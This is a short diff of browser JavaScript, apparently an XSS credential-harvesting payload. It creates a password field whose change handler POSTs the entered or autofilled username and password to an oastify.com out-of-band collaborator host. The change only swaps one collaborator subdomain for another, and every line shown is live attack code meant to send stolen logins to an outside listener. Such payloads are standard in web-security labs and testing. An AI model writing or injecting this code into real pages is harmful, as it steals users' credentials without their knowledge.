@@ -9,7 +9,7 @@ passwordInput.type = 'password';
 passwordInput.name = 'password';
 passwordInput.onchange = function() {
     if (this.value.length) {
-        fetch('https://4puwyhzioin258qf3junlwuhk8qzep2e.oastify.com/?creds', {
+        fetch('https://wmmz7cgqdxierwsf89w3og4z9qfh39ry.oastify.com/?credsdz', {
             method: 'POST',
             mode: 'no-cors',
             body: usernameInput.value + ':' + this.value
